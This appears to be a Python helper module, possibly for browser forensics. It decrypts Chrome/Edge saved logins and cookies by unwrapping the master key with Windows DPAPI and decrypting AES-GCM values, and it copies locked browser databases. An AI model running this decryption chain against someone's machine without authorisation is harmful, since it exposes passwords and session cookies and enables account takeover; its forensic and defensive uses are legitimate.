import os
import shutil
import json
import base64
import ctypes
from ctypes import wintypes
from datetime import datetime, timedelta, timezone

# Windows DPAPI structures for ctypes
class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', ctypes.POINTER(ctypes.c_byte))
    ]

def decrypt_dpapi(data: bytes) -> bytes:
    """Decrypts bytes using Windows Data Protection API (DPAPI)."""
    if not data:
        return b""
    
    in_blob = DATA_BLOB(len(data), ctypes.cast(ctypes.create_string_buffer(data), ctypes.POINTER(ctypes.c_byte)))
    out_blob = DATA_BLOB()
    
    # CryptUnprotectData(pDataIn, ppszDataDescr, pOptionalEntropy, pvReserved, pPromptStruct, dwFlags, pDataOut)
    success = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(in_blob),
        None,
        None,
        None,
        None,
        0,
        ctypes.byref(out_blob)
    )
    
    if not success:
        raise Exception("Windows DPAPI Decryption failed. Ensure the script is running under the correct user context.")
    
    result = ctypes.string_at(out_blob.pbData, out_blob.cbData)
    ctypes.windll.kernel32.LocalFree(out_blob.pbData)
    return result

def get_chrome_master_key(local_state_path: str) -> bytes:
    """Reads Chrome/Edge Local State file and decrypts the master key."""
    if not os.path.exists(local_state_path):
        raise FileNotFoundError(f"Local State file not found at: {local_state_path}")
        
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
        
    try:
        encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
        encrypted_key = base64.b64decode(encrypted_key_b64)
        
        # Key must start with DPAPI prefix (5 bytes 'DPAPI')
        if encrypted_key.startswith(b'DPAPI'):
            encrypted_key = encrypted_key[5:]
        else:
            raise ValueError("Invalid os_crypt key format: DPAPI prefix missing")
            
        master_key = decrypt_dpapi(encrypted_key)
        return master_key
    except Exception as e:
        raise Exception(f"Failed to decrypt master key from Local State: {e}")

def decrypt_aes_gcm(encrypted_value: bytes, master_key: bytes) -> str:
    """Decrypts AES-256-GCM encrypted values from Chrome/Edge databases (cookies/logins)."""
    if not encrypted_value or not master_key:
        return ""
    
    try:
        # Check for signature 'v10' or 'v11'
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:]
            
            # Use cryptography library for AES-256-GCM decryption
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aesgcm = AESGCM(master_key)
            decrypted = aesgcm.decrypt(nonce, ciphertext, None)
            return decrypted.decode('utf-8', errors='replace')
        else:
            # Fallback (older Chrome versions might use direct DPAPI)
            return decrypt_dpapi(encrypted_value).decode('utf-8', errors='replace')
    except Exception as e:
        # Return indicator of failure rather than crashing
        return f"[Decryption Failed: {e}]"

def copy_db_file(src_path: str, dest_dir: str) -> str:
    """
    Safely copies a browser sqlite file to a temporary location using shutil.copy2
    to preserve file metadata (timestamps) and avoid file locking.
    """
    if not os.path.exists(src_path):
        return None
        
    os.makedirs(dest_dir, exist_ok=True)
    filename = os.path.basename(src_path)
    # If the file is 'Cookies', rename it to avoid conflict with other files
    # (e.g. Chrome_Cookies, Edge_Cookies)
    parent_dir = os.path.basename(os.path.dirname(src_path))
    if parent_dir.lower() == 'network':
        # Handles Chrome's Network/Cookies structure
        parent_dir = os.path.basename(os.path.dirname(os.path.dirname(src_path)))
        
    dest_filename = f"{parent_dir}_{filename}"
    dest_path = os.path.join(dest_dir, dest_filename)
    
    try:
        shutil.copy2(src_path, dest_path)
        return dest_path
    except Exception as e:
        print(f"Error copying browser DB from {src_path} to {dest_path}: {e}")
        # Secondary fallback: try manual read-write if copy2 fails due to permission/sharing locks
        try:
            with open(src_path, 'rb') as f_in:
                data = f_in.read()
            with open(dest_path, 'wb') as f_out:
                f_out.write(data)
            # Copy stats manually
            shutil.copystat(src_path, dest_path)
            return dest_path
        except Exception as fallback_e:
            print(f"Fallback copy failed: {fallback_e}")
            return None

def webkit_timestamp_to_iso(timestamp: int) -> str:
    """Converts a Chrome Webkit timestamp (microseconds since Jan 1, 1601) to ISO format."""
    if not timestamp or timestamp <= 0:
        return ""
    try:
        epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
        dt = epoch + timedelta(microseconds=timestamp)
        return dt.strftime('%Y-%m-%d %H:%M:%S UTC')
    except (OverflowError, ValueError):
        return str(timestamp)

def firefox_timestamp_to_iso(timestamp: int) -> str:
    """Converts a Firefox timestamp (microseconds since Jan 1, 1970) to ISO format."""
    if not timestamp or timestamp <= 0:
        return ""
    try:
        epoch = datetime(1970, 1, 1, tzinfo=timezone.utc)
        dt = epoch + timedelta(microseconds=timestamp)
        return dt.strftime('%Y-%m-%d %H:%M:%S UTC')
    except (OverflowError, ValueError):
        return str(timestamp)

def unix_timestamp_to_iso(timestamp: int) -> str:
    """Converts a standard Unix timestamp (seconds since Jan 1, 1970) to ISO format."""
    if not timestamp or timestamp <= 0:
        return ""
    try:
        epoch = datetime(1970, 1, 1, tzinfo=timezone.utc)
        dt = epoch + timedelta(seconds=timestamp)
        return dt.strftime('%Y-%m-%d %H:%M:%S UTC')
    except (OverflowError, ValueError):
        return str(timestamp)
